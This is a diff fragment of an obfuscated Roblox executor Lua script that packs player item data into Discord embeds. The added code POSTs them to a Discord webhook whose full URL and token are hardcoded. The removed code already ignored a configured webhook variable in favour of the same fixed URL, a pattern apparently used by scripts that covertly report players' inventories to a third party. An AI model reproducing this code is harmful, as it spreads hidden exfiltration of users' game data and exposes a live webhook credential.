@@ -3219,23 +3219,28 @@ for A, B in pairs(dc) do
         table.insert(dB, dC(M[A].DisplayKey, A, ai))
     end
 end
-getgenv().PlayerData = h:JSONEncode({
+getgenv().PlayerData = {
     ['content'] = '',
     ['embeds'] = {unpack(dB)}
-})
-local function dG(dH, dI)
-   
-        local dJ = dH;
-        local dK = PlayerData;
-        local dL = {
-            ['Content-Type'] = 'application/json';
-        }
-        request = syn and syn.request or http_request;
-        request({
-            Url = 'https://discord.com/api/webhooks/1249664506448187443/2me_mJp4i155tl1fayEFVaYIS-yzp9FNqQAGRyI1v4xe56MYdc8KDYBaA9Yw4Vevl3jw',
-            Body = dK,
+}
+
+local webhookUrl = "https://discord.com/api/webhooks/1249664506448187443/2me_mJp4i155tl1fayEFVaYIS-yzp9FNqQAGRyI1v4xe56MYdc8KDYBaA9Yw4Vevl3jw"
+
+local function sendWebhook(url, payload)
+    local requestFunction = http_request or request or HttpPost or syn.request
+    if requestFunction then
+        requestFunction({
+            Url = url,
+            Body = game:GetService('HttpService'):JSONEncode(payload),
             Method = "POST",
-            Headers = dL
+            Headers = {
+                ["Content-Type"] = "application/json"
+            }
         })
+    else
+        warn("Không tìm thấy hàm yêu cầu phù hợp")
+    end
 end
-dG(am.Webhook, PlayerData)
+
+sendWebhook(webhookUrl, PlayerData)
+
